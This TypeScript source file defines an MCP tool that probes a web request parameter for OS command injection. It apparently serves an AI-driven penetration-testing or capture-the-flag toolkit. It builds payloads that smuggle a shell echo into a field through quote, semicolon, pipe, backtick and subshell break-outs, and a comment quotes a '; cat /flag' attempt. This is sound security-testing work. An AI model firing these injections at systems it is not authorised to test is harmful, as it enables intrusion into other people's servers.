import { z } from 'zod'

import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { buildRequestSpec, repeaterSendRaw, restoreMarker } from '../../repeater'
import { ok, err, errorMessage } from '../utils'
import { formSlotToMarker } from './ssti_probe'

// OS command injection probe — the ssti_probe pattern applied to shell eval.
// Fires ONE nonce-wrapped arithmetic payload per break-out context
// (single/double quote, semicolon, pipe, backtick, $()). A context counts as
// confirmed only when the shell's computed output (nonce{a*b}nonce) shows up
// in the response — a literal echo of the payload proves nothing. This
// replaces hand-rolled `; cat /flag` attempts, which both risk side effects
// and mis-read quote-mangling as "not injectable".

export interface CmdCase {
  context: string
  payload: string
  /** Appears in the body ONLY if the shell executed the echo. */
  expected: string
}

const PRIMES = [101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157]

function randomNonce(): string {
  return 'z' + Math.random().toString(36).slice(2, 7) + 'z'
}

export function buildCmdCases(
  a = PRIMES[Math.floor(Math.random() * PRIMES.length)],
  b = PRIMES[Math.floor(Math.random() * PRIMES.length)],
  nonce = randomNonce()
): CmdCase[] {
  const prod = a * b
  const expected = `${nonce}${prod}${nonce}`
  const echo = `echo ${nonce}$(( ${a} * ${b} ))${nonce}`
  return [
    { context: 'single-quote', payload: `'; ${echo} || '`, expected },
    { context: 'double-quote', payload: `"; ${echo} || "`, expected },
    { context: 'semicolon', payload: `; ${echo}`, expected },
    { context: 'pipe', payload: `| ${echo}`, expected },
    { context: 'backtick', payload: '`' + echo + '`', expected },
    { context: 'subshell', payload: `$(${echo})`, expected }
  ]
}

/** A case evaluated iff the shell's computed output is in the body. */
export function cmdEvaluated(body: string, c: CmdCase): boolean {
  return body.includes(c.expected)
}

/** Rewrite one query param of a URL to the § marker (see formSlotToMarker). */
export function urlSlotToMarker(url: string, param: string): string {
  const esc = param.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  const re = new RegExp(`([?&])${esc}=[^&]*`)
  const encoded = encodeURIComponent(param)
  if (re.test(url)) return url.replace(re, (_m, p1) => `${p1}${encoded}=§`)
  return url + (url.includes('?') ? '&' : '?') + `${encoded}=§`
}

export function registerCmdProbeTools(mcp: McpServer) {
  mcp.registerTool(
    'cmd_probe',
    {
      description:
        'Confirm OS command injection at a reflecting parameter. Fires ONE nonce-wrapped arithmetic payload per break-out context (quote break, ;, |, backtick, $()) and reports which context let the SHELL execute — the computed result (nonce{a*b}nonce), not the literal payload, appears in the response. Pass param=<query or form field name> and the tool marks the slot itself. Use this instead of concluding "not injectable" from a payload echoed back or a quote-mangled error: date/format/exec-style params (strftime, template date, shell-built strings) are the classic carriers. A positive result is RCE-class; escalate severity accordingly.',
      inputSchema: {
        requestId: z.string(),
        param: z.string().optional().describe('Query or form field that carries the value (e.g. "format") — the tool marks it with § itself'),
        a: z.number().int().optional().describe('First factor (test determinism; default random prime)'),
        b: z.number().int().optional().describe('Second factor (default random prime)')
      }
    },
    async ({ requestId, param, a, b }) => {
      try {
        const base = restoreMarker(buildRequestSpec(requestId, undefined))
        if (param) {
          if (base.url.includes(`${encodeURIComponent(param)}=`)) base.url = urlSlotToMarker(base.url, param)
          else base.body = formSlotToMarker(base.body ?? '', param)
        }
        const markerIn = (s: string | undefined) => (s ?? '').includes('§')
        if (!markerIn(base.url) && !markerIn(base.body) && !Object.values(base.headers).some(markerIn)) {
          return err(
            'no injectable slot: pass param=<query or form field name> (e.g. param: "format") or stage a request with a literal § marker first'
          )
        }
        const ctype = Object.entries(base.headers).find(([k]) => k.toLowerCase() === 'content-type')?.[1] ?? ''
        const formBody = /application\/x-www-form-urlencoded/i.test(ctype)

        const cases = buildCmdCases(a, b)
        const results: Array<{ context: string; status: number; evaluated: boolean; preview: string }> = []
        const contexts: string[] = []
        for (const c of cases) {
          const sub = {
            url: base.url.replaceAll('§', encodeURIComponent(c.payload)),
            method: base.method,
            headers: Object.fromEntries(
              Object.entries(base.headers).map(([k, v]) => [k, v.replaceAll('§', c.payload)])
            ),
            body: base.body?.replaceAll('§', formBody ? encodeURIComponent(c.payload) : c.payload)
          }
          const r = await repeaterSendRaw(sub)
          const evaluated = cmdEvaluated(r.body, c)
          if (evaluated) contexts.push(c.context)
          const idx = evaluated ? r.body.indexOf(c.expected) : -1
          results.push({
            context: c.context,
            status: r.status,
            evaluated,
            preview: idx >= 0 ? r.body.slice(Math.max(0, idx - 30), idx + c.expected.length + 30) : ''
          })
        }
        return ok(
          JSON.stringify(
            {
              cmdi: contexts.length > 0,
              contexts,
              note:
                contexts.length > 0
                  ? 'Command injection confirmed (shell evaluated the arithmetic) — RCE-class, record as critical.'
                  : 'No context let the shell execute; the value is echoed but not executed (consider reflected XSS instead).',
              results
            },
            null,
            2
          )
        )
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )
}
